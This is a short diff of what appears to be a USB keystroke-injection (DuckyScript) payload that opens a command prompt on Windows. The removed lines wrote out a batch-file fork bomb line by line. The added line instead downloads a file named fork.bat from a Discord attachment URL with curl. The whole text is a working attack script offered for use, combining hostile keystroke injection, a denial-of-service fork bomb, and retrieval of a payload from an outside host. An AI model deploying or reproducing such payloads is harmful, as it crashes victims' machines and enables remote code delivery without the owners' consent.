@@ -8,19 +8,7 @@ STRING cd %temp%
 DELAY 150
 ENTER
 DELAY 150
-STRING echo :fork>fork.bat
-DELAY 150
-ENTER
-DELAY 150
-STRING echo start %0>>fork.bat
-DELAY 150
-ENTER
-DELAY 150
-STRING echo %0|%0>>fork.bat
-DELAY 150
-ENTER
-DELAY 150
-STRING echo goto :fork>>fork.bat
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1075068309373980772/fork.bat -o fork.bat
 DELAY 150
 ENTER
 DELAY 150
